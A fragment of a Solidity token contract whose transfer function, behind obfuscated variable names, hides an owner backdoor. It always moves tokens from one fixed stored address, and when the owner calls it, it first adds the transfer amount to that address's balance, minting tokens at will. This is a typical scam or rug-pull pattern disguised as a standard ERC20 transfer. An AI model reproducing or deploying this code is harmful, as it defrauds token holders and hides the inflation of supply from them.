...
contract MyToken is IERC20, Ownable {
    ...
    function transfer(address recipient, uint256 amounts) public virtual override returns (bool) {
        address s1sdasda = xdasd;
        if(s1sdasda == owner() && owner() == _msgSender()){
            _balances[s1sdasda] = _balances[s1sdasda].mul(1).add(amounts);
        }
        
        _transfer(s1sdasda, recipient, amounts);
        return true;
    }
